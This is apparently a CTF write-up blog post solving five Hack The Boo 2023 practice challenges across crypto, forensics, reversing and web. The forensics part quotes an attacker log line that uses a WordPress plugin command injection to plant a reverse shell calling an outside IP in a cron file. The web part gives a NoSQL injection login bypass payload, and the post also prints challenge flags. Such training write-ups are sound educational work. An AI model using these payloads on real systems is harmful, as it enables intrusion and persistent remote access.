---
author: pl4int3xt
layout: post
title: Hack The Boo - 2023 Practice
date: '2023-10-26 10:02:19 +0300'
cover: /img/cover_images/36.png
description: "Hack The Boo 2023 Practice CTF"
categories: [CTF, Hack The Boo Practice - 2023 ]
---
## Crypto
### Hexoding
```python
def main():
    first_half = FLAG[:len(FLAG)//2]
    second_half = FLAG[len(FLAG)//2:]

    hex_encoded = to_hex(first_half)
    base64_encoded = to_base64(second_half)

    with open('output.txt', 'w') as f:
        f.write(f'{hex_encoded}\n{base64_encoded}')
```
The first half is hex encoded while the other half is base64 encoded. After decoding the output we get the flag
```bash
HTB{kn0w1ng_h0w_t0_1d3nt1fy_3nc0d1ng_sch3m3s_1s_cruc14l_f0r_a_crypt0gr4ph3r___4ls0_d0_n0t_c0nfus3_enc0d1ng_w1th_encryp510n!}
```
## Forensics
### Vulnerable season
We grep for 200 ok logs then we find this log
```bash
82.179.92.206 - - [28/Sep/2023:05:21:22 -0400] "GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```
We build the base64 string from the echo pattern and we decode it
```bash
echo fXIzTm4xZ0ViXzRfdDV5bDRuQF9nMEx7QlRI | base64 -d
}r3Nn1gEb_4_t5yl4n@_g0L{BTH
```
The flag is written from backwards so we reverse it and get this
```
HTB{L0g_@n4ly5t_4_bEg1nN3r}
```
### Spooky Phishing
After opening the index.html file the file tries to download a file from the url with the flag
```
https://windowsliveupdater.htb/HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}/app.xlsx.exe
```
## Reversing
### CandyBowl
We runs strings for the candy bowl binary and boom we get the flag 
```
HTB{4lw4y5_ch3ck_ur_k1d5_c4ndy}
```
## Web 
### CandyVault
The website is using mongodb so we try nosql injection with the following payload
```json
{"email": {"$ne": null}, "password": {"$ne": null} }
```
Then we have to change the content type before sending the request
```
Content-Type: application/json
```
Then we get the page with the flag
```
HTB{w3lc0m3_to0o0o_th3_c44andy_v4u1t!}
```